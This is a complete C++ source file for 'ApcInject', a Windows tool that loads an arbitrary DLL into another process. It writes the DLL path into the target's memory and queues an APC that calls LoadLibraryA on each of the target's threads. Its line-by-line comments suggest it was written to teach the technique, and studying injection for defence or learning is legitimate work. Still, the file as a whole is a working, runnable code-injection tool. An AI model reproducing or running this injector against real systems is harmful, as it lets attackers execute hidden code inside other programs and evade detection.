#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

using namespace std;

// Custom system error printing function
void PrintError(const char* text)
{
	DWORD err = GetLastError();
	LPSTR buf = nullptr;

	FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |       // Allocate a buffer, retrieve from system error message, ignore inserts
		FORMAT_MESSAGE_FROM_SYSTEM |           // Get the message from the system's message table
		FORMAT_MESSAGE_IGNORE_INSERTS,         // Do not include insert sequences in the message
		nullptr,                               // lpSource: Pointer to the source; use nullptr for system messages
		err,                                   // dwMessageId: The error code for which we want the message
		0,                                     // dwLanguageId: Use default language
		(LPSTR)&buf,                           // lpBuffer: Allocate a buffer to receive the formatted message
		0,                                     // nSize: Size of the buffer; 0 to use the allocated size
		nullptr);                              // Arguments: Pointer to additional arguments; nullptr if not needed

	if (buf) // strip trailing CR/LF
	{
		char* p = buf;
		while (*p && (*p != '\r') && (*p != '\n')) ++p;
		*p = '\0';
	}

	printf("%s (0x%lX: %s)\n", text, err, buf ? buf : "<unknown>");    // Print system error code with it's description
	LocalFree(buf);                          // hMem: Pointer to the memory to be freed; frees the allocated buffer from FormatMessage
}

vector<DWORD> GetProcessThreads(DWORD pid) {
	vector<DWORD> tids;

	// Enumerate threads in a process
	auto hSnapshot = CreateToolhelp32Snapshot(
		TH32CS_SNAPTHREAD,  // dwFlags: Specifies the type of information to be included in the snapshot; TH32CS_SNAPTHREAD retrieves threads
		0);                 // dwProcessId: If this parameter is zero, the snapshot includes all threads in the system
	
	// Check for valid snapshots
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return tids;

	THREADENTRY32 te = { sizeof(te) };
	if (Thread32First(
		hSnapshot,            // hSnapshot: Handle to the snapshot of threads; must have been created with CreateToolhelp32Snapshot
		&te                   // lpte: Pointer to a THREADENTRY32 structure that receives information about the first thread in the snapshot
	)) {
		// Loop through each thread
		do {
			if (te.th32OwnerProcessID == pid) {
				// Add the valid thread ID to the tids vector
				tids.push_back(te.th32ThreadID);
			}
		} while (Thread32Next(hSnapshot, &te));
	}

	CloseHandle(hSnapshot);    // hObject: Releases the snapshot handle to free resources
	return tids;
}

int main(int argc, const char* argv[]) {
	if (argc < 3) {
		printf("Usage: ApcInject <pid> <dllpath>\n");
		return 0;
	}

	int pid = atoi(argv[1]);
	// Open the procees with the specified PID in argv[1]
	HANDLE hProcess = OpenProcess(
		PROCESS_VM_WRITE | PROCESS_VM_OPERATION,  // dwDesiredAccess: Allows writing to and operating on the virtual memory of the process
		FALSE,                                    // bInheritHandle: Set to FALSE to prevent the handle from being inherited by child processes
		pid);                                     // dwProcessId: The identifier of the process we want to open
	if (!hProcess) {
		PrintError("Failed to open process");
		return 1;
	}

	// Allocate some memory inside the target process
	void* buffer = VirtualAllocEx(
		hProcess,                             // hProcess: Handle to the process in which memory is to be allocated; obtained from OpenProcess
		nullptr,                              // lpAddress: Pointer to the desired starting address; set to nullptr for the system to choose the address
		1 << 12,                              // dwSize: Size of the memory region to allocate, specified as 4 KB (1 shifted left by 12 bits)
		MEM_COMMIT | MEM_RESERVE,             // flAllocationType: Indicates the allocation options; MEM_COMMIT commits the memory, MEM_RESERVE reserves it
		PAGE_READWRITE);                      // flProtect: Memory protection for the region; PAGE_READWRITE allows reading and writing
	if (!buffer) {
		PrintError("Failed to allocate memory");
		return 1;
	}

	// Copy the path of DLL specified in argv[2] inside the process memory
	if (!WriteProcessMemory(
		hProcess,                              // hProcess: Handle to the process in which memory is to be written; obtained from OpenProcess
		buffer,                                // lpBaseAddress: Pointer to the address in the target process where data will be written
		argv[2],                               // lpBuffer: Pointer to the data to be written; in this case, the second command-line argument
		strlen(argv[2]),                       // dwSize: Number of bytes to write; calculated as the length of the string in argv[2]
		nullptr                                // lpNumberOfBytesWritten: Pointer to a variable that receives the number of bytes written; set to nullptr if not needed
	)) {
		PrintError("Failed in WriteProcessMemory");
		return 1;
	}

	// Obtain a list of all threads in the target process
	auto tids = GetProcessThreads(pid);   // pid: The identifier of the process for which to retrieve the thread information
	if (tids.empty()) {
		printf("Failed to locate threads in process %u\n", pid);
		return 1;
	}

	for (const DWORD tid : tids) {
		// Open a handle to each thread in the target process
		HANDLE hThread = OpenThread(
			THREAD_SET_CONTEXT,                // dwDesiredAccess: Allows the thread to be modified, such as changing context
			FALSE,                             // bInheritHandle: Set to FALSE to prevent the handle from being inherited by child processes
			tid);                              // dwThreadId: The identifier of the thread to open
		if (hThread) {
			// Queue an APC for each thread in the target process
			QueueUserAPC(
				(PAPCFUNC)GetProcAddress(            // pfnAPC: Retrieve the address of the LoadLibraryA function from kernel32.dll
					GetModuleHandle(L"kernel32"),         // hModule: Get a handle to the kernel32 module
					"LoadLibraryA"                        // lpProcName: Name of the function to retrieve the address for
				),
				hThread,                             // hThread: Handle to the thread that will execute the APC
				(ULONG_PTR)buffer);                  // dwData: Pointer to the parameter passed to LoadLibraryA; in this case, the buffer containing the library path
			CloseHandle(hThread);              // hObject: Close the handle to the thread after queuing the APC to avoid resource leaks
		}
	}
	printf("APC sent!\n");

	CloseHandle(hProcess);        // hObject: Releases the target process handle to free resources

	return 0;
}
